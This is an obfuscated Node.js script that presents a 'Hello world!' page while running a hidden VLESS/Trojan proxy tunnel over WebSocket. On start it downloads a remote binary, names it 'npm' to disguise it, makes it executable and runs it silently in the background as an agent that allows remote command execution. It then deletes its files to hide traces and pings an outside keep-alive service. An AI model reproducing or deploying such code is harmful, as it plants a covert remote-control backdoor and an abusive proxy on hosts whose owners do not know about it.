const _0x472b52=_0x39cb;(function(_0x487370,_0xc9594a){const _0x28f100=_0x39cb,_0x17dd8e=_0x487370();while(!![]){try{const _0x1e20e3=parseInt(_0x28f100(0x94))/0x1*(-parseInt(_0x28f100(0xfd))/0x2)+-parseInt(_0x28f100(0xdc))/0x3*(parseInt(_0x28f100(0xa1))/0x4)+parseInt(_0x28f100(0xeb))/0x5+parseInt(_0x28f100(0xc5))/0x6*(-parseInt(_0x28f100(0x8b))/0x7)+-parseInt(_0x28f100(0x9e))/0x8*(parseInt(_0x28f100(0x8a))/0x9)+-parseInt(_0x28f100(0xb6))/0xa+parseInt(_0x28f100(0x92))/0xb;if(_0x1e20e3===_0xc9594a)break;else _0x17dd8e['push'](_0x17dd8e['shift']());}catch(_0x11895a){_0x17dd8e['push'](_0x17dd8e['shift']());}}}(_0x214e,0x57a9c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x472b52(0xbd)),net=require(_0x472b52(0x96)),path=require(_0x472b52(0xd9)),crypto=require(_0x472b52(0xfe)),{Buffer}=require(_0x472b52(0xc8)),{exec,execSync}=require(_0x472b52(0xdd)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x472b52(0xac)]||_0x472b52(0x91),NEZHA_SERVER=process[_0x472b52(0xae)][_0x472b52(0xea)]||'',NEZHA_PORT=process[_0x472b52(0xae)][_0x472b52(0xe8)]||'',NEZHA_KEY=process[_0x472b52(0xae)][_0x472b52(0xde)]||'',DOMAIN=process[_0x472b52(0xae)]['DOMAIN']||_0x472b52(0xcb),AUTO_ACCESS=process[_0x472b52(0xae)]['AUTO_ACCESS']||![],WSPATH=process['env'][_0x472b52(0xb9)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x472b52(0xae)][_0x472b52(0xf8)]||'sub',NAME=process[_0x472b52(0xae)]['NAME']||'',PORT=process[_0x472b52(0xae)][_0x472b52(0xb0)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x1703fb=_0x472b52;try{const _0x3b3d41=await axios[_0x1703fb(0x90)]('https://api.ip.sb/geoip'),_0x170ec3=_0x3b3d41[_0x1703fb(0xf1)];ISP=(_0x170ec3[_0x1703fb(0x9a)]+'-'+_0x170ec3[_0x1703fb(0xa8)])[_0x1703fb(0x9c)](/ /g,'_');}catch(_0x25de68){ISP=_0x1703fb(0xa6);}};GetISP();const httpServer=http[_0x472b52(0xc6)]((_0x27891e,_0x5a360b)=>{const _0x315a9c=_0x472b52;if(_0x27891e['url']==='/'){const _0x12e3b2=path['join'](__dirname,_0x315a9c(0xce));fs['readFile'](_0x12e3b2,_0x315a9c(0xa0),(_0x119064,_0x2d5828)=>{const _0x122493=_0x315a9c;if(_0x119064){_0x5a360b[_0x122493(0xd2)](0xc8,{'Content-Type':_0x122493(0xdf)}),_0x5a360b[_0x122493(0xed)](_0x122493(0xda));return;}_0x5a360b['writeHead'](0xc8,{'Content-Type':_0x122493(0xdf)}),_0x5a360b['end'](_0x2d5828);});return;}else{if(_0x27891e['url']==='/'+SUB_PATH){const _0x55c51d=NAME?NAME+'-'+ISP:ISP,_0x57b47b=_0x315a9c(0xcd)+UUID+_0x315a9c(0x89)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x315a9c(0xd3)+WSPATH+'#'+_0x55c51d,_0x448b84=_0x315a9c(0xf2)+UUID+_0x315a9c(0xec)+DOMAIN+_0x315a9c(0xc1)+DOMAIN+_0x315a9c(0xd3)+WSPATH+'#'+_0x55c51d,_0x31e102=_0x57b47b+'\x0a'+_0x448b84,_0x3e5afb=Buffer[_0x315a9c(0xaa)](_0x31e102)[_0x315a9c(0xf7)]('base64');_0x5a360b['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x5a360b[_0x315a9c(0xed)](_0x3e5afb+'\x0a');}else _0x5a360b['writeHead'](0x194,{'Content-Type':_0x315a9c(0xb3)}),_0x5a360b[_0x315a9c(0xed)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x472b52(0xe6))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x472b52(0xb1),_0x472b52(0xbf)];function resolveHost(_0x5d6d71){return new Promise((_0x25ea9b,_0x1b46bf)=>{const _0x1ab792=_0x39cb;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1ab792(0x8d)](_0x5d6d71)){_0x25ea9b(_0x5d6d71);return;}let _0x1597d4=0x0;function _0x52801c(){const _0xb3a837=_0x1ab792;if(_0x1597d4>=DNS_SERVERS[_0xb3a837(0xbb)]){_0x1b46bf(new Error(_0xb3a837(0xe1)+_0x5d6d71+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x809f5f=DNS_SERVERS[_0x1597d4];_0x1597d4++;const _0x3a4071=_0xb3a837(0xa9)+encodeURIComponent(_0x5d6d71)+_0xb3a837(0xf0);axios[_0xb3a837(0x90)](_0x3a4071,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0xb3a837(0xb7)](_0x77e31e=>{const _0x16938d=_0xb3a837,_0x39b339=_0x77e31e[_0x16938d(0xf1)];if(_0x39b339[_0x16938d(0x95)]===0x0&&_0x39b339[_0x16938d(0xaf)]&&_0x39b339[_0x16938d(0xaf)][_0x16938d(0xbb)]>0x0){const _0x472723=_0x39b339[_0x16938d(0xaf)]['find'](_0x12426e=>_0x12426e['type']===0x1);if(_0x472723){_0x25ea9b(_0x472723['data']);return;}}_0x52801c();})[_0xb3a837(0xf5)](_0x2fae29=>{_0x52801c();});}_0x52801c();});}function handleVlessConnection(_0x3a96c4,_0x2c9c8c){const _0x452c17=_0x472b52,[_0x3b0fd9]=_0x2c9c8c,_0x45ffd3=_0x2c9c8c[_0x452c17(0xb4)](0x1,0x11);if(!_0x45ffd3['every']((_0x450085,_0x18d2ab)=>_0x450085==parseInt(uuid[_0x452c17(0x9d)](_0x18d2ab*0x2,0x2),0x10)))return![];let _0x1826b6=_0x2c9c8c[_0x452c17(0xb4)](0x11,0x12)[_0x452c17(0xee)]()+0x13;const _0x54f63a=_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6,_0x1826b6+=0x2)[_0x452c17(0xe0)](0x0),_0x1c5891=_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6,_0x1826b6+=0x1)['readUInt8'](),_0x3abe58=_0x1c5891==0x1?_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6,_0x1826b6+=0x4)[_0x452c17(0x8c)]('.'):_0x1c5891==0x2?new TextDecoder()[_0x452c17(0xa3)](_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6+0x1,_0x1826b6+=0x1+_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6,_0x1826b6+0x1)[_0x452c17(0xee)]())):_0x1c5891==0x3?_0x2c9c8c[_0x452c17(0xb4)](_0x1826b6,_0x1826b6+=0x10)[_0x452c17(0x8f)]((_0x5aff76,_0x17f18c,_0x162ec8,_0x3b2202)=>_0x162ec8%0x2?_0x5aff76['concat'](_0x3b2202[_0x452c17(0xb4)](_0x162ec8-0x1,_0x162ec8+0x1)):_0x5aff76,[])[_0x452c17(0xad)](_0x49f166=>_0x49f166[_0x452c17(0xe0)](0x0)['toString'](0x10))[_0x452c17(0x8c)](':'):'';_0x3a96c4[_0x452c17(0xd8)](new Uint8Array([_0x3b0fd9,0x0]));const _0x20297e=createWebSocketStream(_0x3a96c4);return resolveHost(_0x3abe58)[_0x452c17(0xb7)](_0x4dc606=>{const _0x4f6ca4=_0x452c17;net[_0x4f6ca4(0xe3)]({'host':_0x4dc606,'port':_0x54f63a},function(){const _0x336e11=_0x4f6ca4;this[_0x336e11(0xcf)](_0x2c9c8c[_0x336e11(0xb4)](_0x1826b6)),_0x20297e['on'](_0x336e11(0xcc),()=>{})[_0x336e11(0xd6)](this)['on'](_0x336e11(0xcc),()=>{})[_0x336e11(0xd6)](_0x20297e);})['on'](_0x4f6ca4(0xcc),()=>{});})[_0x452c17(0xf5)](_0x54d0a4=>{const _0x43ded4=_0x452c17;net[_0x43ded4(0xe3)]({'host':_0x3abe58,'port':_0x54f63a},function(){const _0x35da63=_0x43ded4;this[_0x35da63(0xcf)](_0x2c9c8c[_0x35da63(0xb4)](_0x1826b6)),_0x20297e['on'](_0x35da63(0xcc),()=>{})['pipe'](this)['on'](_0x35da63(0xcc),()=>{})[_0x35da63(0xd6)](_0x20297e);})['on'](_0x43ded4(0xcc),()=>{});}),!![];}function handleTrojanConnection(_0x1a16cb,_0x16ac5a){const _0x47d3b7=_0x472b52;try{if(_0x16ac5a[_0x47d3b7(0xbb)]<0x3a)return![];const _0xe27f32=_0x16ac5a[_0x47d3b7(0xb4)](0x0,0x38)[_0x47d3b7(0xf7)](),_0xd5588=[UUID];let _0x30ef0b=null;for(const _0x30300e of _0xd5588){const _0x24971f=crypto['createHash'](_0x47d3b7(0xd1))[_0x47d3b7(0xf9)](_0x30300e)[_0x47d3b7(0xfc)](_0x47d3b7(0x88));if(_0x24971f===_0xe27f32){_0x30ef0b=_0x30300e;break;}}if(!_0x30ef0b)return![];let _0x410a43=0x38;_0x16ac5a[_0x410a43]===0xd&&_0x16ac5a[_0x410a43+0x1]===0xa&&(_0x410a43+=0x2);const _0x8ce9cc=_0x16ac5a[_0x410a43];if(_0x8ce9cc!==0x1)return![];_0x410a43+=0x1;const _0x190ef4=_0x16ac5a[_0x410a43];_0x410a43+=0x1;let _0x9d9eba,_0x4699c5;if(_0x190ef4===0x1)_0x9d9eba=_0x16ac5a['slice'](_0x410a43,_0x410a43+0x4)[_0x47d3b7(0x8c)]('.'),_0x410a43+=0x4;else{if(_0x190ef4===0x3){const _0x3a7541=_0x16ac5a[_0x410a43];_0x410a43+=0x1,_0x9d9eba=_0x16ac5a[_0x47d3b7(0xb4)](_0x410a43,_0x410a43+_0x3a7541)[_0x47d3b7(0xf7)](),_0x410a43+=_0x3a7541;}else{if(_0x190ef4===0x4)_0x9d9eba=_0x16ac5a[_0x47d3b7(0xb4)](_0x410a43,_0x410a43+0x10)[_0x47d3b7(0x8f)]((_0x3fa745,_0x3f0cde,_0x3cf94e,_0xa9db7c)=>_0x3cf94e%0x2?_0x3fa745[_0x47d3b7(0xc4)](_0xa9db7c[_0x47d3b7(0xb4)](_0x3cf94e-0x1,_0x3cf94e+0x1)):_0x3fa745,[])[_0x47d3b7(0xad)](_0xd0078d=>_0xd0078d[_0x47d3b7(0xe0)](0x0)['toString'](0x10))[_0x47d3b7(0x8c)](':'),_0x410a43+=0x10;else return![];}}_0x4699c5=_0x16ac5a['readUInt16BE'](_0x410a43),_0x410a43+=0x2;_0x410a43<_0x16ac5a[_0x47d3b7(0xbb)]&&_0x16ac5a[_0x410a43]===0xd&&_0x16ac5a[_0x410a43+0x1]===0xa&&(_0x410a43+=0x2);const _0x53dd17=createWebSocketStream(_0x1a16cb);return resolveHost(_0x9d9eba)[_0x47d3b7(0xb7)](_0xf0cb30=>{const _0x1ea009=_0x47d3b7;net[_0x1ea009(0xe3)]({'host':_0xf0cb30,'port':_0x4699c5},function(){const _0x23fb76=_0x1ea009;_0x410a43<_0x16ac5a[_0x23fb76(0xbb)]&&this['write'](_0x16ac5a[_0x23fb76(0xb4)](_0x410a43)),_0x53dd17['on'](_0x23fb76(0xcc),()=>{})[_0x23fb76(0xd6)](this)['on'](_0x23fb76(0xcc),()=>{})[_0x23fb76(0xd6)](_0x53dd17);})['on']('error',()=>{});})['catch'](_0x54ce40=>{const _0x26d7cc=_0x47d3b7;net['connect']({'host':_0x9d9eba,'port':_0x4699c5},function(){const _0xaa5f4a=_0x39cb;_0x410a43<_0x16ac5a[_0xaa5f4a(0xbb)]&&this[_0xaa5f4a(0xcf)](_0x16ac5a[_0xaa5f4a(0xb4)](_0x410a43)),_0x53dd17['on'](_0xaa5f4a(0xcc),()=>{})[_0xaa5f4a(0xd6)](this)['on']('error',()=>{})[_0xaa5f4a(0xd6)](_0x53dd17);})['on'](_0x26d7cc(0xcc),()=>{});}),!![];}catch(_0x48db02){return![];}}wss['on'](_0x472b52(0xff),(_0xdbfd0a,_0x3891a6)=>{const _0x4bf414=_0x472b52,_0xab80ad=_0x3891a6['url']||'';_0xdbfd0a['once'](_0x4bf414(0xc0),_0x2c7711=>{const _0x4343df=_0x4bf414;if(_0x2c7711[_0x4343df(0xbb)]>0x11&&_0x2c7711[0x0]===0x0){const _0x432968=_0x2c7711[_0x4343df(0xb4)](0x1,0x11),_0x18e6b7=_0x432968[_0x4343df(0xe5)]((_0x1da05e,_0x5c7b0b)=>_0x1da05e==parseInt(uuid[_0x4343df(0x9d)](_0x5c7b0b*0x2,0x2),0x10));if(_0x18e6b7){!handleVlessConnection(_0xdbfd0a,_0x2c7711)&&_0xdbfd0a[_0x4343df(0xef)]();return;}}!handleTrojanConnection(_0xdbfd0a,_0x2c7711)&&_0xdbfd0a['close']();})['on'](_0x4bf414(0xcc),()=>{});});const getDownloadUrl=()=>{const _0x3dfded=_0x472b52,_0x55159d=os[_0x3dfded(0xbc)]();return _0x55159d===_0x3dfded(0xa4)||_0x55159d===_0x3dfded(0xb5)||_0x55159d==='aarch64'?!NEZHA_PORT?_0x3dfded(0xb2):_0x3dfded(0xa7):!NEZHA_PORT?_0x3dfded(0x97):_0x3dfded(0xb8);},downloadFile=async()=>{const _0x2684b1=_0x472b52;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x28ded3=getDownloadUrl(),_0x3ee37d=await axios({'method':_0x2684b1(0x90),'url':_0x28ded3,'responseType':'stream'}),_0x4a1cf5=fs[_0x2684b1(0xc9)](_0x2684b1(0xd4));return _0x3ee37d[_0x2684b1(0xf1)]['pipe'](_0x4a1cf5),new Promise((_0x498898,_0x2403f1)=>{const _0x2c0dfb=_0x2684b1;_0x4a1cf5['on'](_0x2c0dfb(0xa2),()=>{const _0x4695e9=_0x2c0dfb;console[_0x4695e9(0x86)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x38cd42=>{if(_0x38cd42)_0x2403f1(_0x38cd42);_0x498898();});}),_0x4a1cf5['on'](_0x2c0dfb(0xcc),_0x2403f1);});}catch(_0x11a349){throw _0x11a349;}},runnz=async()=>{const _0x121840=_0x472b52;try{const _0x504f7b=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x504f7b[_0x121840(0xbe)]()!==''){console[_0x121840(0x86)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4d6842){}await downloadFile();let _0x303c0e='',_0x228c79=[_0x121840(0xe7),'8443',_0x121840(0xc7),_0x121840(0xba),_0x121840(0x9b),_0x121840(0xab)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x53f082=_0x228c79[_0x121840(0xd0)](NEZHA_PORT)?_0x121840(0xe2):'';_0x303c0e=_0x121840(0xf6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x53f082+_0x121840(0xca);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x317b57=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x121840(0xdb)](':')[_0x121840(0xe9)]():'',_0xa211a1=_0x228c79[_0x121840(0xd0)](_0x317b57)?'true':_0x121840(0xd5),_0x24733b='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x121840(0xf3)+_0xa211a1+_0x121840(0x9f)+UUID;fs[_0x121840(0xc2)](_0x121840(0xa5),_0x24733b);}_0x303c0e=_0x121840(0x8e);}else{console[_0x121840(0x86)](_0x121840(0x93));return;}}try{exec(_0x303c0e,{'shell':_0x121840(0x98)},_0x42babf=>{const _0x2dc2af=_0x121840;if(_0x42babf)console[_0x2dc2af(0xcc)](_0x2dc2af(0xfa),_0x42babf);else console[_0x2dc2af(0x86)](_0x2dc2af(0x99));});}catch(_0x137f09){console['error'](_0x121840(0xfb)+_0x137f09);}};async function addAccessTask(){const _0x17b528=_0x472b52;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x113874='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x493215=await axios['post'](_0x17b528(0xd7),{'url':_0x113874},{'headers':{'Content-Type':'application/json'}});console[_0x17b528(0x86)](_0x17b528(0xe4));}catch(_0x548464){}}const delFiles=()=>{const _0x3b1186=_0x472b52;fs['unlink'](_0x3b1186(0xd4),()=>{}),fs[_0x3b1186(0x87)](_0x3b1186(0xa5),()=>{});};function _0x39cb(_0x1c4f04,_0x4790ee){_0x1c4f04=_0x1c4f04-0x86;const _0x214e24=_0x214e();let _0x39cbec=_0x214e24[_0x1c4f04];return _0x39cbec;}httpServer[_0x472b52(0xf4)](PORT,()=>{const _0x30b801=_0x472b52;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x30b801(0xc3)+PORT);});function _0x214e(){const _0x5b6b34=['false','pipe','https://oooo.serv00.net/add-url','send','path','Hello\x20world!','split','34041pwOlEx','child_process','NEZHA_KEY','text/html','readUInt16BE','Failed\x20to\x20resolve\x20','--tls','connect','Automatic\x20Access\x20Task\x20added\x20successfully','every','Server','443','NEZHA_PORT','pop','NEZHA_SERVER','1127345BqezFD','@cdns.doon.eu.org:443?security=tls&sni=','end','readUInt8','close','&type=A','data','trojan://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','listen','catch','setsid\x20nohup\x20./npm\x20-s\x20','toString','SUB_PATH','update','npm\x20running\x20error:','error:\x20','digest','4NBXaue','crypto','connection','log','unlink','hex','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','6102918GmaJFh','917wmiIqQ','join','test','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','reduce','get','bc17e290-5afe-4d44-a375-95fae3bb3a25','18166522HXDidr','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','7022ggVXCs','Status','net','https://amd64.ssss.nyc.mn/v1','/bin/bash','npm\x20is\x20running','country_code','2083','replace','substr','8HsViIV','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf8','188hnYFmQ','finish','decode','arm','config.yaml','Unknown','https://arm64.ssss.nyc.mn/agent','isp','https://dns.google/resolve?name=','from','2053','UUID','map','env','Answer','PORT','8.8.4.4','https://arm64.ssss.nyc.mn/v1','text/plain','slice','arm64','2338910fZwOmN','then','https://amd64.ssss.nyc.mn/agent','WSPATH','2087','length','arch','axios','trim','1.1.1.1','message','&fp=chrome&type=ws&host=','writeFileSync','Server\x20is\x20running\x20on\x20port\x20','concat','2682vQgtaa','createServer','2096','buffer','createWriteStream','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1234.abc.com','error','vless://','index.html','write','includes','sha224','writeHead','&path=%2F','npm'];_0x214e=function(){return _0x5b6b34;};return _0x214e();}
